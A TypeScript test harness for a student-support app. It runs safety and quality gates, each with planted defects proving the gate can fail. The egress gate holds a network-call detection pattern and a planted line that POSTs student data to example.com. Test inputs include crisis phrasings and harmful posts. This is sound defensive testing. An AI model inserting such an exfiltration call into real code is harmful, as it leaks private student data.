import { mkdirSync, readFileSync, readdirSync, statSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { EvidenceStore } from '@zthr/evidence';
import { type Gate, type Proof, fail, pass, proveGate, runProvenGate, type Verdict } from '@zthr/gates';
import { loadCards, lockVerdict, type Lock } from '@zthr/intent';
import { ApprovalService, OutboundGate, screen as realScreen, type OutboundAction, type SafetyResult } from '@zthr/runtime';
import { randomBytes } from 'node:crypto';
import { Advocate } from '../apps/advocate/src/agents/advocate.js';
import { DAYTON_CATALOG } from '../apps/advocate/src/catalog/dayton.js';
import type { Resource } from '../apps/advocate/src/catalog/types.js';
import { checkTone } from '../apps/advocate/src/domain/tone.js';
import { snap } from '../apps/advocate/src/eligibility/engine.js';
import { Community, moderate } from '../apps/advocate/src/domain/community.js';
import { SNAP_FY2027 } from '../apps/advocate/src/eligibility/params.js';
import type { OutboundMessage, Student } from '../apps/advocate/src/domain/types.js';
import type { ActionResult } from '../apps/advocate/src/agents/actions.js';
import { CONTROL, JOURNEY_DIR, OUT, ROOT, readLock } from './lib.js';

/**
 * Every named gate states what it protects, carries the planted defects that
 * prove it can fail, and is run only with a proof pinned to its current
 * definition (Pattern 8). A gate whose proof is missing or stale reports
 * unknown, which never admits.
 */
const DAY = '2026-11-02';
const def = (fn: (...a: never[]) => unknown) => fn.toString();

// ---- subjects ----

type MessageSet = OutboundMessage[];
const sampleStudent = (a: Advocate) =>
  a.createStudent({ chosenName: 'Gate', zip: '45402', household: { size: 2, monthlyGrossIncome: 1500 }, enrollment: { college: 'sinclair', creditHours: 12, weeklyWorkHours: 20, degreeSeeking: true } });

function productMessages(): MessageSet {
  const a = new Advocate({ today: () => DAY });
  const s = sampleStudent(a);
  a.addDeadline(s.id, { title: 'Essay 2', course: 'ENG 1101', due: '2026-11-05', kind: 'assignment', effortHours: 8, source: { type: 'student' }, confirmed: true });
  a.addDeadline(s.id, { title: 'Lab 3', course: 'BIO 1111', due: '2026-10-30', kind: 'assignment', effortHours: 3, source: { type: 'student' }, confirmed: true });
  a.setMoney(s.id, 100, [{ name: 'Rent', amount: 900, dueDay: 1, kind: 'rent' }], { amount: 300, next: '2026-11-20', everyDays: 14 });
  const crisis = (['eviction', 'utility-shutoff', 'car', 'no-food', 'rent-short'] as const).map((x) => a.crisis(s.id, x).message);
  return [a.todayMessage(s.id), ...a.lookAhead(s.id), a.moneyCheck(s.id)!, a.moneyFoundMessage(s.id), ...crisis, a.helpMessage(s.id, 'food'), a.helpMessage(s.id, 'caregiving'), a.explainMessage(s.id, 'what is a registrar')!, a.guideMessage(s.id, 'how do I sign a lease')!].filter(Boolean);
}

interface Dispatcher {
  dispatch: (a: OutboundAction, token: undefined) => Promise<{ sent: boolean }>;
  sent: OutboundAction[];
}
const realDispatcher = (): Dispatcher => {
  const sent: OutboundAction[] = [];
  const gate = new OutboundGate(new ApprovalService(randomBytes(32)), async (x) => void sent.push(x));
  return { dispatch: (a, t) => gate.dispatch(a, t), sent };
};

const HELD_OUT_CRISIS = ['I want to end my life', 'thinking about suicide again', "I don't want to wake up tomorrow", 'he hit me last night and I am scared', 'I overdosed on my meds'];

type FindFn = (catalog: Resource[]) => string[];
const realFind: FindFn = (catalog) => {
  const a = new Advocate({ today: () => DAY, catalog });
  return a.findHelp(sampleStudent(a).id, 'food').options.map((o) => o.resource.id);
};
const staleCatalog = () => DAYTON_CATALOG.map((r) => (r.id === 'house-of-bread' ? { ...r, verifiedOn: '2025-06-01' } : r));

type SealedProbe = { sealedValue: string; messages: string[] };
const realSealedProbe = (): SealedProbe => {
  const a = new Advocate({ today: () => DAY });
  const s = sampleStudent(a);
  const sealedValue = 'released from prison in March, on parole';
  a.seal(s.id, 'justice_involvement', sealedValue);
  const out = [...a.converse(s.id, 'I need food'), ...a.converse(s.id, 'today'), ...a.converse(s.id, 'what do I qualify for')].map((m) => m.text);
  return { sealedValue, messages: out };
};

type EvidenceProbe = { ids: string[]; dump: string };
const realEvidenceProbe = (): EvidenceProbe => {
  const a = new Advocate({ today: () => DAY });
  const s = sampleStudent(a);
  a.converse(s.id, 'I need food');
  a.textIn('+19375550000', 'hi');
  return { ids: [s.id, s.chosenName, '+19375550000', s.zip], dump: JSON.stringify(a.evidence.events()) };
};

const STATUS_Q = /\b(what is your|are you a|do you have|tell me your|enter your)\b[^.?]*\b(citizen(ship)?|immigration|legal status|green card|visa|social security)\b/i;
const onboardingPrompts = (): string[] => {
  const a = new Advocate({ today: () => DAY });
  const out: string[] = [];
  for (const t of ['hi', 'Sinclair 45402', '3 people, $2000', '12 credits, 20 hours', 'Sam']) out.push(...a.textIn('+19375550001', t));
  for (const t of ['I need food', 'Wright State 45435']) out.push(...a.textIn('+19375550002', t));
  return out;
};

type EligFn = (s: Student, on: string) => { status: string };
const snapLimitOracle = (fn: EligFn): string[] => {
  // Record-derived oracle: expected outcomes come from the published table, not typed into the test.
  const a = new Advocate({ today: () => DAY });
  const bad: string[] = [];
  SNAP_FY2027.value.gross130.forEach((limit, i) => {
    const size = i + 1;
    const mk = (income: number) => a.createStudent({ chosenName: 'O', zip: '45402', age: 30, household: { size, monthlyGrossIncome: income }, enrollment: { college: 'sinclair', creditHours: 3 } });
    if (fn(mk(limit), DAY).status !== 'likely') bad.push(`size ${size} at limit`);
    if (fn(mk(limit + 1), DAY).status !== 'unlikely') bad.push(`size ${size} over limit`);
  });
  return bad;
};

function sourceFiles(dir: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const f of readdirSync(dir)) {
    const p = join(dir, f);
    if (statSync(p).isDirectory()) Object.assign(out, sourceFiles(p));
    else if (f.endsWith('.ts')) out[p.replace(ROOT, '')] = readFileSync(p, 'utf8');
  }
  return out;
}

// ---- gates ----

const toneGate: Gate<MessageSet> = {
  id: 'tone-and-next-step',
  protects: 'No message to a student scolds, reads above their level, or reports a problem without a next step (PRD P3, P4).',
  definition: def(checkTone),
  check: (ms) => {
    const bad = ms.map((m) => ({ m, r: checkTone(m, 'standard', 8) })).filter((x) => !x.r.ok);
    return bad.length ? fail('tone-and-next-step', bad.map((x) => `${x.m.author}: ${x.r.problems.join(', ')}`).join(' | ')) : pass('tone-and-next-step', `${ms.length} product messages pass`);
  },
  falsification: [
    { name: 'planted scolding message', plant: () => [{ studentId: 'x', author: 'planted', urgency: 'routine', text: "You're late on your essay again.", nextSteps: [{ label: 'ok', action: 'ok' }] }] },
    { name: 'planted message with no next step', plant: () => [{ studentId: 'x', author: 'planted', urgency: 'routine', text: 'Your bill is due Friday.', nextSteps: [] }] },
  ],
};

const approvalGate: Gate<Dispatcher> = {
  id: 'student-sends',
  protects: 'Nothing reaches an outside party without a single-use approval token for that exact content (PRD P9).',
  definition: def(OutboundGate.prototype.dispatch),
  check: async (d) => {
    const r = await d.dispatch({ studentId: 's', kind: 'email', recipient: 'landlord', content: { body: 'x' } }, undefined);
    return r.sent || d.sent.length > 0 ? fail('student-sends', 'an action was sent without an approval token') : pass('student-sends', 'refused without a token');
  },
  falsification: [{ name: 'planted dispatcher that ignores tokens', plant: () => { const sent: OutboundAction[] = []; return { sent, dispatch: async (a) => (sent.push(a), { sent: true }) }; } }],
};

const safetyGate: Gate<(m: string) => SafetyResult> = {
  id: 'safety-router',
  protects: 'Crisis messages, including held-out phrasings, route to 988 before any model (PRD SAF-1).',
  definition: def(realScreen),
  check: (fn) => {
    const missed = HELD_OUT_CRISIS.filter((m) => !fn(m).crisis);
    return missed.length ? fail('safety-router', `missed: ${missed.join(' | ')}`) : pass('safety-router', `${HELD_OUT_CRISIS.length} held-out phrasings routed`);
  },
  falsification: [{ name: 'planted router that only knows one phrase', plant: () => (m: string) => ({ crisis: /kill myself/i.test(m), categories: [] }) }],
};

const freshnessGate: Gate<FindFn> = {
  id: 'freshness',
  protects: 'A catalog entry past its freshness window is never offered as available (PRD P11).',
  definition: def(realFind),
  check: (fn) => (fn(staleCatalog()).includes('house-of-bread') ? fail('freshness', 'a stale entry was offered') : pass('freshness', 'stale entry withheld')),
  falsification: [{ name: 'planted finder that ignores freshness', plant: () => (catalog: Resource[]) => catalog.filter((r) => r.categories.includes('food')).map((r) => r.id) }],
};

const sealedGate: Gate<SealedProbe> = {
  id: 'sealed-facts',
  protects: 'A sealed fact never appears in a message unless the student released it to a playbook that needs it (PRD P10).',
  definition: def(realSealedProbe),
  check: (p) => {
    const words = p.sealedValue.split(/\W+/).filter((w) => w.length > 4);
    const leaked = p.messages.filter((m) => words.some((w) => new RegExp(`\\b${w}\\b`, 'i').test(m)));
    return leaked.length ? fail('sealed-facts', `sealed words in ${leaked.length} messages`) : pass('sealed-facts', `${p.messages.length} messages clean`);
  },
  falsification: [{ name: 'planted message quoting the sealed fact', plant: () => ({ sealedValue: 'released from prison in March, on parole', messages: ['Since you were released from prison, here is help.'] }) }],
};

const evidenceGate: Gate<EvidenceProbe> = {
  id: 'evidence-pseudonymous',
  protects: 'The evidence store holds no student identifiers or content.',
  definition: def(realEvidenceProbe),
  check: (p) => {
    const found = p.ids.filter((id) => p.dump.includes(id));
    return found.length ? fail('evidence-pseudonymous', `identifiers in evidence: ${found.length}`) : pass('evidence-pseudonymous', 'no identifiers found');
  },
  falsification: [{ name: 'planted evidence row with a phone number', plant: () => ({ ids: ['+19375550000'], dump: '[{"subject":"+19375550000"}]' }) }],
};

const statusGate: Gate<string[]> = {
  id: 'no-status-question',
  protects: 'The team never asks about citizenship or immigration status (PRD NAV-7).',
  definition: STATUS_Q.source,
  check: (prompts) => {
    const bad = prompts.filter((p) => STATUS_Q.test(p));
    return bad.length ? fail('no-status-question', bad.join(' | ')) : pass('no-status-question', `${prompts.length} prompts checked`);
  },
  falsification: [{ name: 'planted citizenship question', plant: () => ['Are you a US citizen? Reply YES or NO.'] }],
};

const oracleGate: Gate<EligFn> = {
  id: 'snap-income-oracle',
  protects: 'SNAP income results match the published FY2027 table at and just over every limit (record-derived oracle, Pattern 17).',
  definition: def(snapLimitOracle),
  check: (fn) => {
    const bad = snapLimitOracle(fn);
    return bad.length ? fail('snap-income-oracle', bad.join(', ')) : pass('snap-income-oracle', 'all limits match the table');
  },
  falsification: [{ name: 'planted off-by-one limit', plant: () => (s: Student, on: string) => (s.household.monthlyGrossIncome === SNAP_FY2027.value.gross130[0] ? { status: 'unlikely' } : snap(s, on)) }],
};

const lockGate: Gate<{ lock: Lock }> = {
  id: 'journey-lock',
  protects: 'No change can edit or remove the journey cards it is judged by (Pattern 18).',
  definition: def(lockVerdict),
  check: ({ lock }) => {
    const v = lockVerdict(loadCards(JOURNEY_DIR), lock);
    return v.status === 'pass' ? v : fail('journey-lock', v.reason);
  },
  falsification: [{ name: 'planted lock missing a card', plant: () => { const l = readLock(); const [first] = Object.keys(l.cards); const cards = { ...l.cards }; delete cards[first!]; return { lock: { cards } }; } }],
};

const egressGate: Gate<Record<string, string>> = {
  id: 'no-hidden-egress',
  protects: 'Only the model client and the outbound gate may reach the network; domain and agent code cannot (PRD P2).',
  definition: 'fetch|http.request|https.request outside packages/models and packages/runtime/src/approval.ts',
  check: (files) => {
    const bad = Object.entries(files).filter(([p, src]) => !p.startsWith('packages/models/') && !p.includes('/test/') && !p.startsWith('tools/') && /\bfetch\s*\(|\bhttps?\.request\s*\(/.test(src));
    return bad.length ? fail('no-hidden-egress', bad.map(([p]) => p).join(', ')) : pass('no-hidden-egress', `${Object.keys(files).length} files scanned`);
  },
  falsification: [{ name: 'planted fetch in a domain file', plant: () => ({ 'apps/advocate/src/domain/leak.ts': "await fetch('https://example.com', { method: 'POST', body: JSON.stringify(student) })" }) }],
};

type CommunityFactory = () => { post: Community['post']; visible: Community['visible'] };
const HELD_OUT_POSTS = ['DM me 937 555 0111 for answers to the quiz', 'selling xanax and adderall', 'pay me on cash app send $30 first', 'I will beat up him after class', 'free stuff at https://tinyurl.com/x'];
const moderationGate: Gate<CommunityFactory> = {
  id: 'community-moderation',
  protects: 'Harmful or risky posts never surface in the community (PRD COM-5).',
  definition: def(moderate),
  check: (make) => {
    const c = make();
    const base = { college: 'sinclair', communities: [] as string[], expires: '2026-12-01' };
    for (const t of HELD_OUT_POSTS) c.post('gate', { ...base, type: 'offer', category: 'help', text: t });
    const shown = c.visible('sinclair').filter((p) => HELD_OUT_POSTS.includes(p.text));
    return shown.length ? fail('community-moderation', `${shown.length} harmful posts surfaced`) : pass('community-moderation', `${HELD_OUT_POSTS.length} held-out harmful posts held`);
  },
  falsification: [{ name: 'planted community with no filters', plant: () => () => { const posts: { text: string }[] = []; return { post: ((_s: string, p: { text: string }) => (posts.push(p), p)) as unknown as Community['post'], visible: (() => posts) as unknown as Community['visible'] }; } }],
};

// ---- no dead ends: every button any agent offers does something, in app and text alike ----

type Perform = (a: Advocate, sid: string, action: string) => ActionResult | undefined;

/** A student with a full life, so every agent has something to say. */
export function richStudent(): { a: Advocate; sid: string; seeds: OutboundMessage[] } {
  const a = new Advocate({ today: () => DAY });
  const s = sampleStudent(a);
  const sid = s.id;
  a.addClasses(sid, [{ course: 'BIO 1111', days: ['Mon', 'Wed'], start: '09:00', end: '10:15', building: 'Building 3', room: '212' }]);
  a.addShifts(sid, [{ date: '2026-11-03', start: '15:00', end: '21:00', employer: 'Kroger' }]);
  const essay = a.addDeadline(sid, { title: 'Essay 2', course: 'ENG 1101', due: '2026-11-05', kind: 'assignment', effortHours: 8, source: { type: 'student' }, confirmed: true });
  a.addDeadline(sid, { title: 'Lab 3', course: 'BIO 1111', due: '2026-10-30', kind: 'assignment', effortHours: 3, source: { type: 'student' }, confirmed: true });
  const appt = a.addDeadline(sid, { title: 'Advising appointment', due: '2026-11-04T09:30', kind: 'appointment', durationMin: 30, source: { type: 'student' }, confirmed: true });
  void appt;
  a.addDeadline(sid, { title: 'Quiz 4', course: 'BIO 1111', due: '2026-11-12', kind: 'exam', source: { type: 'syllabus', line: 'Nov 12 Quiz 4' }, confirmed: false });
  a.setMoney(sid, 100, [{ name: 'Rent', amount: 900, dueDay: 1, kind: 'rent' }, { name: 'Electric', amount: 120, dueDay: 10, kind: 'utility' }], { amount: 300, next: '2026-11-20', everyDays: 14 });
  a.connectSource(sid, 'forwarding');
  const mt = a.addMeeting(sid, { title: 'Group project', date: '2026-11-04', start: '18:00', attendees: ['Ana', 'Lee'], course: 'ENG 1101' });
  const seeds: OutboundMessage[] = [
    a.todayMessage(sid),
    ...a.lookAhead(sid),
    a.moneyCheck(sid),
    a.moneyFoundMessage(sid),
    a.week(sid).message,
    a.weeklyPreview(sid),
    ...a.conflictMessages(sid),
    a.pulse(sid),
    a.planMessage(sid, essay.id),
    a.assignmentHelp(sid, essay.id),
    a.meetingPrep(sid, mt.id),
    a.licensedMessage(sid, 'legal'),
    a.licensedMessage(sid, 'tax'),
    a.courseworkBoundaryMessage(sid),
    a.forward(sid, 'Your financial aid file was selected for verification. Please submit documents.', { subject: 'Verification required' }).message,
    a.forward(sid, 'Class canceled today', { subject: 'BIO 1111 canceled' }).message,
    a.forward(sid, 'Our class moved to a new room', { subject: 'Room change' }).message,
    a.uploadSyllabus(sid, 'HIS 1101', 'Sep 3 Reading: Chapter 1\nNov 20 Paper 1 due', '2026-08-24').message,
    ...[...a.playbooks.keys()].map((id) => a.playbookMessage(sid, a.startPlaybook(sid, id))),
  ].filter((m): m is OutboundMessage => !!m);
  return { a, sid, seeds };
}

/** Follow every button breadth-first, the way a curious student would, up to a few taps deep. */
export function walkActions(perform: Perform, depth = 4): { reached: number; dead: string[]; held: string[] } {
  const { a, sid, seeds } = richStudent();
  const seen = new Set<string>();
  const dead: string[] = [];
  const held: string[] = [];
  let frontier = seeds.flatMap((m) => m.nextSteps.map((n) => n.action));
  for (let level = 0; level < depth && frontier.length; level++) {
    const next: string[] = [];
    for (const action of frontier) {
      if (seen.has(action)) continue;
      seen.add(action);
      if (action === 'delete-account') {
        const fresh = richStudent();
        if (!perform(fresh.a, fresh.sid, action)) dead.push(action);
        continue;
      }
      let r: ActionResult | undefined;
      try {
        r = perform(a, sid, action);
      } catch (e) {
        dead.push(`${action} (crashed: ${(e as Error).message})`);
        continue;
      }
      if (!r) {
        dead.push(action);
        continue;
      }
      const tone = checkTone(r.message, 'standard', 8, 'en');
      if (!tone.ok && r.message.urgency !== 'safety') held.push(`${action}: ${tone.problems.join('; ')}`);
      next.push(...r.message.nextSteps.map((n) => n.action));
    }
    frontier = next;
  }
  return { reached: seen.size, dead, held };
}

const realPerform: Perform = (a, sid, action) => a.perform(sid, action);

const deadEndGate: Gate<Perform> = {
  id: 'no-dead-ends',
  protects: 'Every button any agent offers works, in the app and by text (PRD P3, P8).',
  definition: def(walkActions),
  check: (perform) => {
    const r = walkActions(perform);
    if (r.dead.length) return fail('no-dead-ends', `${r.dead.length} buttons go nowhere: ${r.dead.slice(0, 5).join(', ')}`);
    if (r.held.length) return fail('no-dead-ends', `${r.held.length} buttons answer with a message the tone gate holds: ${r.held.slice(0, 3).join(' | ')}`);
    return pass('no-dead-ends', `${r.reached} distinct buttons followed up to 4 taps deep; every one answers`);
  },
  falsification: [
    { name: 'planted registry missing a handler', plant: () => (a: Advocate, sid: string, action: string) => (action.startsWith('hold-block:') ? undefined : a.perform(sid, action)) },
    { name: 'planted handler that answers with no next step', plant: () => (a: Advocate, sid: string, action: string) => { const r = a.perform(sid, action); return r && action.startsWith('mark-done:') ? { ...r, message: { ...r.message, nextSteps: [] } } : r; } },
  ],
};

export async function runGates(store?: EvidenceStore): Promise<{ verdicts: Verdict[]; proofs: Proof[] }> {
  const ev = store ?? (mkdirSync(OUT, { recursive: true }), new EvidenceStore(`${OUT}/evidence.db`));
  const proofs: Proof[] = [];
  const verdicts: Verdict[] = [];
  const run = async <S>(g: Gate<S>, subject: () => S) => {
    const proof = await proveGate(g);
    proofs.push(proof);
    ev.append('gate_proof', g.id, { valid: proof.valid, cases: proof.cases.length, gateHash: proof.gateHash });
    const v = await runProvenGate(g, subject(), proof);
    verdicts.push(v);
    ev.append('gate', g.id, { status: v.status, reason: v.reason });
  };
  await run(toneGate, productMessages);
  await run(approvalGate, realDispatcher);
  await run(safetyGate, () => realScreen);
  await run(freshnessGate, () => realFind);
  await run(sealedGate, realSealedProbe);
  await run(evidenceGate, realEvidenceProbe);
  await run(statusGate, onboardingPrompts);
  await run(oracleGate, () => snap as EligFn);
  await run(lockGate, () => ({ lock: readLock() }));
  await run(moderationGate, () => () => new Community(() => DAY));
  await run(deadEndGate, () => realPerform);
  await run(egressGate, () => ({ ...sourceFiles(`${ROOT}apps/advocate/src`), ...sourceFiles(`${ROOT}packages`) }));
  writeFileSync(`${CONTROL}/proofs.json`, `${JSON.stringify(proofs.map(({ gate, gateHash, valid, cases }) => ({ gate, gateHash, valid, cases: cases.map((c) => c.name) })), null, 2)}\n`);
  return { verdicts, proofs };
}

if (import.meta.url === `file://${process.argv[1]}`) {
  const { verdicts, proofs } = await runGates();
  for (const [i, v] of verdicts.entries()) console.log(`${v.status.padEnd(7)} ${v.gate.padEnd(22)} proof:${proofs[i]!.valid ? 'valid' : 'INVALID'}  ${v.reason}`);
  process.exit(verdicts.every((v) => v.status === 'pass') ? 0 : 1);
}
